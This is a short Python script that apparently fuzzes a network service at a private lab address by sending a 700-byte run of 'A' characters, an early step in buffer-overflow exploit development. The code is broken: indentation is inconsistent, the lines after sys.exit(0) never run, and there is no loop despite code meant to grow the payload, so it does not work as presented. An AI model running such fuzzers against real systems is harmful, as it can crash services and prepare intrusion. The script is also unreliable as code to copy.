#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.200.53"
port = 9999
timeout = 10
prefix = ""
string = "A" * 700

try:
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
except:
  	print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
	sys.exit(0)
 	string += 100 * "A"
 	time.sleep(1)
